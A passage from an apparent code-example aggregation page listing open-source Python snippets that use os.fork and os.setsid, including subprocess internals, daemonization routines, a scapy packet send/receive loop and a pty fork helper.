        @param chroot           (str)       The root directory into which the process will be forced.
        @param long_running     (bool)      Indicates that each client is long-running and only one client should be
                                            handled at a time per process.
        @param loop_interval    (int/float) The interval between loop calls.
        @param timeout          (int/float) The client idle timeout.
        @param timeout_interval (int)       The interval between checks for client timeouts.
        @param worker_count     (int)       The worker process count.
        @param channel_count    (int)       The communication channel count for each worker.
        @param event_manager    (str)       The event manager.
        @param print_settings   (bool)      Indicates that the server settings should be printed to the console.
        """

        self._channels                 = {}               # worker channels
        self._channel_count            = channel_count    # count of channels to be created
        self._chroot                   = chroot           # process chroot
        self._clients                  = {}               # all active clients
        self._event_manager            = None             # event manager instance
        self._event_manager_modify     = None             # event manager modify method
        self._event_manager_poll       = None             # event manager poll method
        self._event_manager_register   = None             # event manager register method
        self._event_manager_unregister = None             # event manager unregister method
        self._group                    = group            # process group
        self._hosts                    = []               # host client/server sockets
        self._is_daemon                = daemonize        # indicates that this is running as a daemon
        self._is_graceful_shutdown     = False            # indicates that the current shutdown request is graceful
        self._is_listening             = False            # indicates that this process is listening on all hosts
        self._is_long_running          = long_running     # indicates that clients are long-running
        self._is_parent                = True             # indicates that this process is the parent
        self._is_shutting_down         = False            # indicates that this server is shutting down
        self._loop_interval            = loop_interval    # the interval in seconds between calling handle_loop()
        self._parent_pid               = os.getpid()      # the parent process id
        self._print_settings           = print_settings   # indicates that the settings should be printed to the console
        self._timeout                  = timeout          # the timeout in seconds for a client to be removed
        self._timeout_interval         = timeout_interval # the interval in seconds between checking for idle clients
        self._umask                    = umask            # process umask
        self._user                     = user             # process user
        self._worker_count             = worker_count     # count of worker processes
        self._workers                  = []               # list of worker process ids

        # choose event manager
        if hasattr(select, "epoll") and (event_manager is None or event_manager == "epoll"):
            self._event_manager = EPollEventManager

        elif hasattr(select, "kqueue") and (event_manager is None or event_manager == "kqueue"):
            self._event_manager = KQueueEventManager
            self._worker_count  = 0

            if worker_count > 0:
                print "KQueue does not support parent process file descriptor inheritence, " \
                      "so workers have been disabled. If you want that ability, you must use the Select event manager."

        elif hasattr(select, "poll") and (event_manager is None or event_manager == "poll"):
            self._event_manager = PollEventManager

        elif hasattr(select, "select") and (event_manager is None or event_manager == "select"):
            self._event_manager = SelectEventManager

        else:
            raise ServerException("Could not find a suitable event manager for your platform")

        # change directory
        if chroot:
            try:
                os.chroot(chroot)

            except Exception, e:
                raise ServerException("Cannot change directory to '%s': %s" % (chroot, e))

        # change umask
        if umask is not None:
            try:
                os.umask(umask)

            except Exception, e:
                raise ServerException("Cannot set umask to '%s': %s" % (umask, e))

        # daemonize
        if daemonize:
            if not hasattr(os, "fork"):
                raise ServerException("Cannot daemonize, because this platform does not support forking")

            if os.fork():
                os._exit(0)

            os.setsid()

            if os.fork():
                os._exit(0)

            self.handle_post_daemonize()

        # initialize the event manager methods and events
        self._event_manager            = self._event_manager(self)
        self._event_manager_modify     = self._event_manager.modify
        self._event_manager_poll       = self._event_manager.poll
        self._event_manager_register   = self._event_manager.register
        self._event_manager_unregister = self._event_manager.unregister

        # update this server with the proper events
        self.EVENT_READ   = self._event_manager.EVENT_READ
        self.EVENT_WRITE  = self._event_manager.EVENT_WRITE

        # update the client module with the proper events
        client.EVENT_LINGER = self._event_manager.EVENT_LINGER
        client.EVENT_READ   = self._event_manager.EVENT_READ
        client.EVENT_WRITE  = self._event_manager.EVENT_WRITE

        # add all hosts
        if hosts:
            for host in hosts:
                self.add_host(*host)

        # change group
        if group:
            try:
                try:
                    import grp
                except:
                    raise ServerException("Cannot set group, because this platform does not support this feature")

                os.setgid(grp.getgrnam(group).gr_gid)

            except Exception, e:
                raise ServerException("Cannot set group to '%s': %s" % (group, e))

        # change user
        if user:
            try:
                try:
                    import pwd
                except:
                    raise ServerException("Cannot set user, because this platform does not support this feature")

                os.setuid(pwd.getpwnam(user).pw_uid)

            except Exception, e:
                raise ServerException("Cannot set user to '%s': %s" % (user, e))

        # register signal handlers
        if platform.system() != "Windows":
            #signal.signal(signal.SIGCHLD, self.handle_signal)
            signal.signal(signal.SIGHUP,  self.handle_signal)

        signal.signal(signal.SIGINT,  self.handle_signal)
        signal.signal(signal.SIGTERM, self.handle_signal)

    # ------------------------------------------------------------------------------------------------------------------

     
Example 42
From project hubjs, under directory tools/wafadmin, in source file pproc.py.
Score: 5
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines, startupinfo, creationflags, shell,
                           p2cread, p2cwrite, c2pread, c2pwrite, errread, errwrite):

            if isinstance(args, types.StringTypes):
                args = [args]
            else:
                args = list(args)

            if shell:
                args = ["/bin/sh", "-c"] + args

            if executable is None:
                executable = args[0]

            errpipe_read, errpipe_write = os.pipe()
            self._set_cloexec_flag(errpipe_write)

            gc_was_enabled = gc.isenabled()
            gc.disable()
            try:
                self.pid = os.fork()
            except:
                if gc_was_enabled:
                    gc.enable()
                raise
            self._child_created = True
            if self.pid == 0:
                try:
                    if p2cwrite:
                        os.close(p2cwrite)
                    if c2pread:
                        os.close(c2pread)
                    if errread:
                        os.close(errread)
                    os.close(errpipe_read)

                    if p2cread:
                        os.dup2(p2cread, 0)
                    if c2pwrite:
                        os.dup2(c2pwrite, 1)
                    if errwrite:
                        os.dup2(errwrite, 2)

                    if p2cread and p2cread not in (0,):
                        os.close(p2cread)
                    if c2pwrite and c2pwrite not in (p2cread, 1):
                        os.close(c2pwrite)
                    if errwrite and errwrite not in (p2cread, c2pwrite, 2):
                        os.close(errwrite)

                    if close_fds:
                        self._close_fds(but=errpipe_write)

                    if cwd is not None:
                        os.chdir(cwd)

                    if preexec_fn:
                        apply(preexec_fn)

                    if env is None:
                        os.execvp(executable, args)
                    else:
                        os.execvpe(executable, args, env)

                except:
                    exc_type, exc_value, tb = sys.exc_info()
                    exc_lines = traceback.format_exception(exc_type, exc_value, tb)
                    exc_value.child_traceback = ''.join(exc_lines)
                    os.write(errpipe_write, pickle.dumps(exc_value))

                os._exit(255)

            if gc_was_enabled:
                gc.enable()
            os.close(errpipe_write)
            if p2cread and p2cwrite:
                os.close(p2cread)
            if c2pwrite and c2pread:
                os.close(c2pwrite)
            if errwrite and errread:
                os.close(errwrite)

            data = os.read(errpipe_read, 1048576)
            os.close(errpipe_read)
            if data != "":
                os.waitpid(self.pid, 0)
                child_exception = pickle.loads(data)
                raise child_exception

         
Example 43
From project hubjs, under directory tools/scons/scons-local-1.2.0/SCons/compat, in source file _scons_subprocess.py.
Score: 5
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            if is_string(args):
                args = [args]

            if shell:
                args = ["/bin/sh", "-c"] + args

            if executable is None:
                executable = args[0]

            # For transferring possible exec failure from child to parent
            # The first char specifies the exception type: 0 means
            # OSError, 1 means some other error.
            errpipe_read, errpipe_write = os.pipe()
            self._set_cloexec_flag(errpipe_write)

            self.pid = os.fork()
            self._child_created = True
            if self.pid == 0:
                # Child
                try:
                    # Close parent's pipe ends
                    if p2cwrite:
                        os.close(p2cwrite)
                    if c2pread:
                        os.close(c2pread)
                    if errread:
                        os.close(errread)
                    os.close(errpipe_read)

                    # Dup fds for child
                    if p2cread:
                        os.dup2(p2cread, 0)
                    if c2pwrite:
                        os.dup2(c2pwrite, 1)
                    if errwrite:
                        os.dup2(errwrite, 2)

                    # Close pipe fds.  Make sure we don't close the same
                    # fd more than once, or standard fds.
                    try:
                        set
                    except NameError:
                        # Fall-back for earlier Python versions, so epydoc
                        # can use this module directly to execute things.
                        if p2cread:
                            os.close(p2cread)
                        if c2pwrite and c2pwrite not in (p2cread,):
                            os.close(c2pwrite)
                        if errwrite and errwrite not in (p2cread, c2pwrite):
                            os.close(errwrite)
                    else:
                        for fd in set((p2cread, c2pwrite, errwrite))-set((0,1,2)):
                            if fd: os.close(fd)

                    # Close all other fds, if asked for
                    if close_fds:
                        self._close_fds(but=errpipe_write)

                    if cwd is not None:
                        os.chdir(cwd)

                    if preexec_fn:
                        apply(preexec_fn)

                    if env is None:
                        os.execvp(executable, args)
                    else:
                        os.execvpe(executable, args, env)

                except KeyboardInterrupt:
                    raise       # SCons:  don't swallow keyboard interrupts

                except:
                    exc_type, exc_value, tb = sys.exc_info()
                    # Save the traceback and attach it to the exception object
                    exc_lines = traceback.format_exception(exc_type,
                                                           exc_value,
                                                           tb)
                    exc_value.child_traceback = string.join(exc_lines, '')
                    os.write(errpipe_write, pickle.dumps(exc_value))

                # This exitcode won't be reported to applications, so it
                # really doesn't matter what we return.
                os._exit(255)

            # Parent
            os.close(errpipe_write)
            if p2cread and p2cwrite:
                os.close(p2cread)
            if c2pwrite and c2pread:
                os.close(c2pwrite)
            if errwrite and errread:
                os.close(errwrite)

            # Wait for exec to fail or succeed; possibly raising exception
            data = os.read(errpipe_read, 1048576) # Exceptions limited to 1 MB
            os.close(errpipe_read)
            if data != "":
                os.waitpid(self.pid, 0)
                child_exception = pickle.loads(data)
                raise child_exception


         
Example 44
From project social-engineer-toolkit, under directory src/core, in source file scapy.py.
Score: 5
vote
vote
def sndrcv(pks, pkt, timeout = 2, inter = 0, verbose=None, chainCC=0, retry=0, multi=0):
    if not isinstance(pkt, Gen):
        pkt = SetGen(pkt)

    if verbose is None:
        verbose = conf.verb
    debug.recv = PacketList([],"Unanswered")
    debug.sent = PacketList([],"Sent")
    debug.match = SndRcvList([])
    nbrecv=0
    ans = []
    # do it here to fix random fields, so that parent and child have the same
    all_stimuli = tobesent = [p for p in pkt]
    notans = len(tobesent)

    hsent={}
    for i in tobesent:
        h = i.hashret()
        if h in hsent:
            hsent[h].append(i)
        else:
            hsent[h] = [i]
    if retry < 0:
        retry = -retry
        autostop=retry
    else:
        autostop=0


    while retry >= 0:
        found=0

        if timeout < 0:
            timeout = None

        rdpipe,wrpipe = os.pipe()
        rdpipe=os.fdopen(rdpipe)
        wrpipe=os.fdopen(wrpipe,"w")

        pid=1
        try:
            pid = os.fork()
            if pid == 0:
                try:
                    sys.stdin.close()
                    rdpipe.close()
                    try:
                        i = 0
                        if verbose:
                            print "Begin emission:"
                        for p in tobesent:
                            pks.send(p)
                            i += 1
                            time.sleep(inter)
                        if verbose:
                            print "Finished to send %i packets." % i
                    except SystemExit:
                        pass
                    except KeyboardInterrupt:
                        pass
                    except:
                        log_runtime.exception("--- Error in child %i" % os.getpid())
                        log_runtime.info("--- Error in child %i" % os.getpid())
                finally:
                    try:
                        os.setpgrp() # Chance process group to avoid ctrl-C
                        sent_times = [p.sent_time for p in all_stimuli if p.sent_time]
                        cPickle.dump( (arp_cache,sent_times), wrpipe )
                        wrpipe.close()
                    except:
                        pass
            elif pid < 0:
                log_runtime.error("fork error")
            else:
                wrpipe.close()
                stoptime = 0
                remaintime = None
                inmask = [rdpipe,pks]
                try:
                    try:
                        while 1:
                            if stoptime:
                                remaintime = stoptime-time.time()
                                if remaintime <= 0:
                                    break
                            r = None
                            if FREEBSD or DARWIN:
                                inp, out, err = select(inmask,[],[], 0.05)
                                if len(inp) == 0 or pks in inp:
                                    r = pks.nonblock_recv()
                            else:
                                inp, out, err = select(inmask,[],[], remaintime)
                                if len(inp) == 0:
                                    break
                                if pks in inp:
                                    r = pks.recv(MTU)
                            if rdpipe in inp:
                                if timeout:
                                    stoptime = time.time()+timeout
                                del(inmask[inmask.index(rdpipe)])
                            if r is None:
                                continue
                            ok = 0
                            h = r.hashret()
                            if h in hsent:
                                hlst = hsent[h]
                                for i in range(len(hlst)):
                                    if r.answers(hlst[i]):
                                        ans.append((hlst[i],r))
                                        if verbose > 1:
                                            os.write(1, "*")
                                        ok = 1
                                        if not multi:
                                            del(hlst[i])
                                            notans -= 1;
                                        else:
                                            if not hasattr(hlst[i], '_answered'):
                                                notans -= 1;
                                            hlst[i]._answered = 1;
                                        break
                            if notans == 0 and not multi:
                                break
                            if not ok:
                                if verbose > 1:
                                    os.write(1, ".")
                                nbrecv += 1
                                if conf.debug_match:
                                    debug.recv.append(r)
                    except KeyboardInterrupt:
                        if chainCC:
                            raise
                finally:
                    try:
                        ac,sent_times = cPickle.load(rdpipe)
                    except EOFError:
                        warning("Child died unexpectedly. Packets may have not been sent %i"%os.getpid())
                    else:
                        arp_cache.update(ac)
                        for p,t in zip(all_stimuli, sent_times):
                            p.sent_time = t
                    os.waitpid(pid,0)
        finally:
            if pid == 0:
                os._exit(0)

        remain = reduce(list.__add__, hsent.values(), [])
        if multi:
            remain = filter(lambda p: not hasattr(p, '_answered'), remain);

        if autostop and len(remain) > 0 and len(remain) != len(tobesent):
            retry = autostop

        tobesent = remain
        if len(tobesent) == 0:
            break
        retry -= 1

    if conf.debug_match:
        debug.sent=PacketList(remain[:],"Sent")
        debug.match=SndRcvList(ans[:])

    #clean the ans list to delete the field _answered
    if (multi):
        for s,r in ans:
            if hasattr(s, '_answered'):
                del(s._answered)

    if verbose:
        print "\nReceived %i packets, got %i answers, remaining %i packets" % (nbrecv+len(ans), len(ans), notans)
    return SndRcvList(ans),PacketList(remain,"Unanswered"),debug.recv


 
Example 45
From project searchlight-master, under directory searchlight/cmd, in source file control.py.
Score: 5
vote
vote
def do_start(verb, pid_file, server, args):
    if verb != 'Respawn' and pid_file == CONF.pid_file:
        for pid_file, pid in pid_files(server, pid_file):
            if os.path.exists('/proc/%s' % pid):
                print(_("%(serv)s appears to already be running: %(pid)s") %
                      {'serv': server, 'pid': pid_file})
                return
            else:
                print(_("Removing stale pid file %s") % pid_file)
                os.unlink(pid_file)

        try:
            resource.setrlimit(resource.RLIMIT_NOFILE,
                               (MAX_DESCRIPTORS, MAX_DESCRIPTORS))
            resource.setrlimit(resource.RLIMIT_DATA,
                               (MAX_MEMORY, MAX_MEMORY))
        except ValueError:
            print(_('Unable to increase file descriptor limit.  '
                    'Running as non-root?'))
        os.environ['PYTHON_EGG_CACHE'] = '/tmp'

    def write_pid_file(pid_file, pid):
        with open(pid_file, 'w') as fp:
            fp.write('%d\n' % pid)

    def redirect_to_null(fds):
        with open(os.devnull, 'r+b') as nullfile:
            for desc in fds:  # close fds
                try:
                    os.dup2(nullfile.fileno(), desc)
                except OSError:
                    pass

    def redirect_to_syslog(fds, server):
        log_cmd = 'logger'
        log_cmd_params = '-t "%s[%d]"' % (server, os.getpid())
        process = subprocess.Popen([log_cmd, log_cmd_params],
                                   stdin=subprocess.PIPE)
        for desc in fds:  # pipe to logger command
            try:
                os.dup2(process.stdin.fileno(), desc)
            except OSError:
                pass

    def redirect_stdio(server, capture_output):
        input = [sys.stdin.fileno()]
        output = [sys.stdout.fileno(), sys.stderr.fileno()]

        redirect_to_null(input)
        if capture_output:
            redirect_to_syslog(output, server)
        else:
            redirect_to_null(output)

    @gated_by(CONF.capture_output)
    def close_stdio_on_exec():
        fds = [sys.stdin.fileno(), sys.stdout.fileno(), sys.stderr.fileno()]
        for desc in fds:  # set close on exec flag
            fcntl.fcntl(desc, fcntl.F_SETFD, fcntl.FD_CLOEXEC)

    def launch(pid_file, conf_file=None, capture_output=False, await_time=0):
        args = [server]
        if conf_file:
            args += ['--config-file', conf_file]
            msg = (_('%(verb)sing %(serv)s with %(conf)s') %
                   {'verb': verb, 'serv': server, 'conf': conf_file})
        else:
            msg = (_('%(verb)sing %(serv)s') % {'verb': verb, 'serv': server})
        print(msg)

        close_stdio_on_exec()

        pid = os.fork()
        if pid == 0:
            os.setsid()
            redirect_stdio(server, capture_output)
            try:
                os.execlp('%s' % server, *args)
            except OSError as e:
                msg = (_('unable to launch %(serv)s. Got error: %(e)s') %
                       {'serv': server, 'e': e})
                sys.exit(msg)
            sys.exit(0)
        else:
            write_pid_file(pid_file, pid)
            await_child(pid, await_time)
            return pid

    @gated_by(CONF.await_child)
    def await_child(pid, await_time):
        bail_time = time.time() + await_time
        while time.time() < bail_time:
            reported_pid, status = os.waitpid(pid, os.WNOHANG)
            if reported_pid == pid:
                global exitcode
                exitcode = os.WEXITSTATUS(status)
                break
            time.sleep(0.05)

    conf_file = None
    if args and os.path.exists(args[0]):
        conf_file = os.path.abspath(os.path.expanduser(args[0]))

    return launch(pid_file, conf_file, CONF.capture_output, CONF.await_child)


 
Example 46
From project play1, under directory python/Lib, in source file subprocess.py.
Score: 5
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            if isinstance(args, types.StringTypes):
                args = [args]
            else:
                args = list(args)

            if shell:
                args = ["/bin/sh", "-c"] + args

            if executable is None:
                executable = args[0]

            # For transferring possible exec failure from child to parent
            # The first char specifies the exception type: 0 means
            # OSError, 1 means some other error.
            errpipe_read, errpipe_write = os.pipe()
            self._set_cloexec_flag(errpipe_write)

            gc_was_enabled = gc.isenabled()
            # Disable gc to avoid bug where gc -> file_dealloc ->
            # write to stderr -> hang.  http://bugs.python.org/issue1336
            gc.disable()
            try:
                self.pid = os.fork()
            except:
                if gc_was_enabled:
                    gc.enable()
                raise
            self._child_created = True
            if self.pid == 0:
                # Child
                try:
                    # Close parent's pipe ends
                    if p2cwrite is not None:
                        os.close(p2cwrite)
                    if c2pread is not None:
                        os.close(c2pread)
                    if errread is not None:
                        os.close(errread)
                    os.close(errpipe_read)

                    # Dup fds for child
                    if p2cread is not None:
                        os.dup2(p2cread, 0)
                    if c2pwrite is not None:
                        os.dup2(c2pwrite, 1)
                    if errwrite is not None:
                        os.dup2(errwrite, 2)

                    # Close pipe fds.  Make sure we don't close the same
                    # fd more than once, or standard fds.
                    if p2cread is not None and p2cread not in (0,):
                        os.close(p2cread)
                    if c2pwrite is not None and c2pwrite not in (p2cread, 1):
                        os.close(c2pwrite)
                    if errwrite is not None and errwrite not in (p2cread, c2pwrite, 2):
                        os.close(errwrite)

                    # Close all other fds, if asked for
                    if close_fds:
                        self._close_fds(but=errpipe_write)

                    if cwd is not None:
                        os.chdir(cwd)

                    if preexec_fn:
                        preexec_fn()

                    if env is None:
                        os.execvp(executable, args)
                    else:
                        os.execvpe(executable, args, env)

                except:
                    exc_type, exc_value, tb = sys.exc_info()
                    # Save the traceback and attach it to the exception object
                    exc_lines = traceback.format_exception(exc_type,
                                                           exc_value,
                                                           tb)
                    exc_value.child_traceback = ''.join(exc_lines)
                    os.write(errpipe_write, pickle.dumps(exc_value))

                # This exitcode won't be reported to applications, so it
                # really doesn't matter what we return.
                os._exit(255)

            # Parent
            if gc_was_enabled:
                gc.enable()
            os.close(errpipe_write)
            if p2cread is not None and p2cwrite is not None:
                os.close(p2cread)
            if c2pwrite is not None and c2pread is not None:
                os.close(c2pwrite)
            if errwrite is not None and errread is not None:
                os.close(errwrite)

            # Wait for exec to fail or succeed; possibly raising exception
            data = os.read(errpipe_read, 1048576) # Exceptions limited to 1 MB
            os.close(errpipe_read)
            if data != "":
                os.waitpid(self.pid, 0)
                child_exception = pickle.loads(data)
                raise child_exception


         
Example 47
From project sagenb, under directory sagenb/notebook, in source file sage_email.py.
Score: 5
vote
vote
def email(to, subject, body = '', from_address = None, verbose = True, block = False, kill_on_exit = False):
    """
    Send an email message.
    
    INPUT:
        to           -- string; address of recipient
        subject      -- string; subject of the email
        body         -- string (default: ''); body of the email
        from_address -- string (default: username@hostname); address
                        email will appear to be from
        verbose      -- whether to print status information when the email is sent
        block        -- bool (default: False); if True this function doesn't
                        return until the email is actually sent.  if
                        False, the email gets sent in a background
                        thread.
        kill_on_exit -- bool (default: False): if True, guarantee that
                        the sending mail subprocess is killed when you
                        exit sage, even if it failed to send the
                        message.  If False, then the subprocess might
                        keep running for a while.  This should never
                        be a problem, but might be useful for certain
                        users.
                        
    EXAMPLES::

        sage: email('xxxsageuser@gmail.com', 'The calculation finished!')  # not tested
        Child process ... is sending email to xxxsageuser@gmail.com

    NOTE: This function does not require configuring an email server
          or anything else at all, since Sage already includes by
          default a sophisticated email server (which is part of
          Twisted).
    """

    # We use Fork to make this work, because we have to start the
    # Twisted reactor in order to use it's powerful sendmail
    # capabilities.  Unfortunately, Twisted is purposely designed so
    # that its reactors cannot be restarted.  Thus if we don't fork,
    # one could send at most one email.  Of course, forking means this
    # won't work on native Windows.  It might be possible to get this
    # to work using threads instead, but I did not do so, since Python
    # threading with Twisted is not fun, and would likely have many
    # of the same problems.  Plus the below works extremely well.
    
    try:
        pid = os.fork()
    except:
        print "Fork not possible -- the email command is not supported on this platform."
        return

    if from_address is None:
        # Use a default email address as the from: line.
        from_address = default_email_address()
    
    if pid: # We're the parent process
        if kill_on_exit:
            # Tell the Sage cleaner about this subprocess, just in case somehow it fails
            # to properly quit (e.g., smtp is taking a long time), so it will get killed
            # no matter what when sage exits.  Zombies are bad bad bad, no matter what!
            from sagenb.misc.misc import register_with_cleaner
            register_with_cleaner(pid)  # register pid of forked process with cleaner
        if verbose:
            print "Child process %s is sending email to %s..."%(pid,to)
        # Now wait for the fake subprocess to finish.
        os.waitpid(pid,0)
        return

    if not block:
        # Do a non-block sendmail, which is typically what a user wants, since it can take
        # a while to send an email.
        
        # Use the old "double fork" trick -- otherwise there would *definitely* be a zombie
        # every time.  Here's a description from the web of this trick:
        # "If you can't stand zombies, you can get rid of them with a double fork().
        #  The forked child immediately forks again while its parent calls waitpid().
        #  The first forked process exits, and the parent's waitpid() returns, right
        #  away.  That leaves an orphaned process whose parent reverts to 1 ("init")."
        pid = os.fork()
        if pid:
            # OK, we're in the subprocess of the subprocess -- we
            # again register the subprocess we just spawned with the
            # zombie cleaner just in case, then we kill ourself, as
            # explained above.
            if kill_on_exit:
                from sagenb.misc.misc import register_with_cleaner
                register_with_cleaner(pid)  # register pid of forked process with cleaner
            os.kill(os.getpid(),9)                 # suicide

    # Now we're the child process.  Let's do stuff with Twisetd!
    from smtpsend import send_mail, reactor

    # First define two callback functions.  Each one optionally prints
    # some information, then kills the subprocess dead.
    def on_success(result):
        """
        Callback in case of a successfully sent email.
        """
        if verbose:
            print "Successfully sent an email to %s."%to
        reactor.stop()
        os.kill(os.getpid(),9)                     # suicide
        
    def on_failure(error):
        """
        Callback in case of a failure sending an email.
        """
        if verbose:
            print "Failed to send email to %s."%to
            print "-"*70
            print error.getErrorMessage()
            print "-"*70
        reactor.stop()
        os.kill(os.getpid(),9)                    # suicide

    # Finally, call the send_mail function.  This is code that sets up
    # a twisted deferred, which actually happens when we run the
    # reactor.  
    send_mail(from_address, to, subject, body, on_success, on_failure)

    # Start the twisted reactor. 
    reactor.run()
 
Example 48
From project nimbus, under directory backend/workspace/vms/xen, in source file xen_v2.py.
Score: 5
vote
vote
def daemonize(self, func_list, arg_list):

        # all log entries were duplicated without closing here first
        if self.opts.logfilehandler:
            self.opts.logfilehandler.close()

        pid = os.fork()

        if not pid:
            # To become the session leader of this new session and the
            # process group leader of the new process group, we call
            # os.setsid().  The process is also guaranteed not to have 
            # a controlling terminal.
            os.setsid()

            # Fork a second child and exit immediately to prevent zombies.
            # This causes the second child process to be orphaned, making the
            # init process responsible for its cleanup.  And, since the first
            # child is a session leader without a controlling terminal, it's
            # possible for it to acquire one by opening a terminal in the
            # future (System V-based systems).  This second fork guarantees
            # that the child is no longer a session leader, preventing the
            # daemon from ever acquiring a controlling terminal.
            pid = os.fork()

            if (pid != 0):
            # exit() or _exit()?  See below.
                os._exit(0) # Exit parent (the 1st child) of the 2nd child.
        else:
            # exit() or _exit()?
            # _exit is like exit(), but it doesn't call any functions
            # registered with atexit (and on_exit) or any registered signal
            # handlers.  It also closes any open file descriptors.  Using
            # exit() may cause all stdio streams to be flushed twice and any
            # temporary files may be unexpectedly removed.  It's therefore
            # recommended that child branches of a fork() and the parent
            # branch(es) of a daemon use _exit().
            os._exit(0)     # Exit parent of the first child.


        # find max # file descriptors
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if (maxfd == resource.RLIM_INFINITY):
            maxfd = MAXFD

        # Iterate through and close all file descriptors.
        for fd in range(0, maxfd):
            try:
                os.close(fd)
            except OSError: # ERROR, fd wasn't open to begin with (ignored)
                pass

        # This call to open is guaranteed to return the lowest file
        # descriptor, which will be 0 (stdin), since it was closed above.
        os.open(REDIRECT_TO, os.O_RDWR)

        # Duplicate stdin to stdout and stderr
        os.dup2(0, 1)
        os.dup2(0, 2)

        # ----------------------------------------
        # work below is done in a daemonized mode:
        # ----------------------------------------

        if self.opts.logfilepath:
            ch = logging.FileHandler(self.opts.logfilepath)
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - "
                                          "%(name)s (%(lineno)d) - %(message)s")
            ch.setFormatter(formatter)
            log.addHandler(ch)

        for i,func in enumerate(func_list):
            if arg_list[i] == None:
                ret = func()
            else:
                ret = func(arg_list[i])


    ##################
    # addWorkspace() #
    ##################
     
Example 49
From project zxing, under directory cpp/scons/scons-local-2.0.0.final.0/SCons/compat, in source file _scons_subprocess.py.
Score: 5
vote
vote
def _execute_child(self, args, executable, preexec_fn, close_fds,
                           cwd, env, universal_newlines,
                           startupinfo, creationflags, shell,
                           p2cread, p2cwrite,
                           c2pread, c2pwrite,
                           errread, errwrite):
            """Execute program (POSIX version)"""

            if is_string(args):
                args = [args]

            if shell:
                args = ["/bin/sh", "-c"] + args

            if executable is None:
                executable = args[0]

            # For transferring possible exec failure from child to parent
            # The first char specifies the exception type: 0 means
            # OSError, 1 means some other error.
            errpipe_read, errpipe_write = os.pipe()
            self._set_cloexec_flag(errpipe_write)

            self.pid = os.fork()
            self._child_created = True
            if self.pid == 0:
                # Child
                try:
                    # Close parent's pipe ends
                    if p2cwrite:
                        os.close(p2cwrite)
                    if c2pread:
                        os.close(c2pread)
                    if errread:
                        os.close(errread)
                    os.close(errpipe_read)

                    # Dup fds for child
                    if p2cread:
                        os.dup2(p2cread, 0)
                    if c2pwrite:
                        os.dup2(c2pwrite, 1)
                    if errwrite:
                        os.dup2(errwrite, 2)

                    # Close pipe fds.  Make sure we don't close the same
                    # fd more than once, or standard fds.
                    try:
                        set
                    except NameError:
                        # Fall-back for earlier Python versions, so epydoc
                        # can use this module directly to execute things.
                        if p2cread:
                            os.close(p2cread)
                        if c2pwrite and c2pwrite not in (p2cread,):
                            os.close(c2pwrite)
                        if errwrite and errwrite not in (p2cread, c2pwrite):
                            os.close(errwrite)
                    else:
                        for fd in set((p2cread, c2pwrite, errwrite))-set((0,1,2)):
                            if fd: os.close(fd)

                    # Close all other fds, if asked for
                    if close_fds:
                        self._close_fds(but=errpipe_write)

                    if cwd is not None:
                        os.chdir(cwd)

                    if preexec_fn:
                        apply(preexec_fn)

                    if env is None:
                        os.execvp(executable, args)
                    else:
                        os.execvpe(executable, args, env)

                except KeyboardInterrupt:
                    raise       # SCons:  don't swallow keyboard interrupts

                except:
                    exc_type, exc_value, tb = sys.exc_info()
                    # Save the traceback and attach it to the exception object
                    exc_lines = traceback.format_exception(exc_type,
                                                           exc_value,
                                                           tb)
                    exc_value.child_traceback = ''.join(exc_lines)
                    os.write(errpipe_write, pickle.dumps(exc_value))

                # This exitcode won't be reported to applications, so it
                # really doesn't matter what we return.
                os._exit(255)

            # Parent
            os.close(errpipe_write)
            if p2cread and p2cwrite:
                os.close(p2cread)
            if c2pwrite and c2pread:
                os.close(c2pwrite)
            if errwrite and errread:
                os.close(errwrite)

            # Wait for exec to fail or succeed; possibly raising exception
            data = os.read(errpipe_read, 1048576) # Exceptions limited to 1 MB
            os.close(errpipe_read)
            if data != "":
                os.waitpid(self.pid, 0)
                child_exception = pickle.loads(data)
                raise child_exception


         
}

#Python os.setsid Examples
{
Python os.setsid Examples

The following are 51 code examples for showing how to use os.setsid. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project play1, under directory python/Lib, in source file pty.py.
Score: 22
vote
vote
def fork():
    """fork() -> (pid, master_fd)
    Fork and make the child a session leader with a controlling terminal."""

    try:
        pid, fd = os.forkpty()
    except (AttributeError, OSError):
        pass
    else:
        if pid == CHILD:
            try:
                os.setsid()
            except OSError:
                # os.forkpty() already set us session leader
                pass
        return pid, fd

    master_fd, slave_fd = openpty()
    pid = os.fork()
    if pid == CHILD:
        # Establish a new session.
        os.setsid()
        os.close(master_fd)

        # Slave becomes stdin/stdout/stderr of child.
        os.dup2(slave_fd, STDIN_FILENO)
        os.dup2(slave_fd, STDOUT_FILENO)
        os.dup2(slave_fd, STDERR_FILENO)
        if (slave_fd > STDERR_FILENO):
            os.close (slave_fd)

        # Explicitly open the tty to make it become a controlling tty.
        tmp_fd = os.open(os.ttyname(STDOUT_FILENO), os.O_RDWR)
        os.close(tmp_fd)
    else:
        os.close(slave_fd)

    # Parent and child process.
    return pid, master_fd

 
Example 2
From project hipl, under directory hipfwmi, in source file FirewallController.py.
Score: 19
vote
vote
def daemonize(self):
        """Makeself a daemon process.

        Double fork, close standard pipes, start a new session and
        open logs.
        """
        pid = os.fork()
        if pid == 0:  # first child
            os.setsid()
            pid = os.fork()
            if pid == 0:  # second child
                # Can't chdir to root if we have relative paths to
                # conffile and other modules
                #os.chdir('/')
                os.umask(0)
            else:
                os._exit(0)
        else:
            os._exit(0)

        # close stdin, stdout and stderr ...
        for fd in range(3):
            try:
                os.close(fd)
            except OSError:
                pass
        # ... and replace them with /dev/null
        os.open('/dev/null', os.O_RDWR)
        os.dup(0)
        os.dup(0)

        syslog.openlog('hip-mgmt-iface',
                       syslog.LOG_PID | syslog.LOG_NDELAY,
                       syslog.LOG_DAEMON)
        syslog.syslog('FirewallController started.')

     
Example 3
